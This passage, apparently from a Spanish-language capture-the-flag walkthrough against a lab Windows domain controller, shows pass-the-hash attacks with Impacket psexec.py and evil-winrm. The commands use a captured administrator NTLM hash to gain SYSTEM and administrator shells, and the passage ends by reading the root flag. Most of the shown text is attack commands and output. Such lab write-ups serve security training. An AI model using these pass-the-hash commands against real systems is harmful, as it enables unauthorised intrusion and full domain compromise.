Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
egotisticalbank\administrator

```

O PSExec para obtener un shell como SISTEMA:

```shell
root@kali# psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175
Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.175.....
[*] Found writable share ADMIN$
[*] Uploading file TQeVYGvK.exe
[*] Opening SVCManager on 10.10.10.175.....
[*] Creating service bEUo on 10.10.10.175.....
[*] Starting service bEUo.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

O incluso puedo usar EvilWinRM:


```shell

root@kali# evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

De cualquier forma, puedo agarrar root.txt

```shell

C:\users\administrator\desktop>type root.txt
f3ee0496************************

```
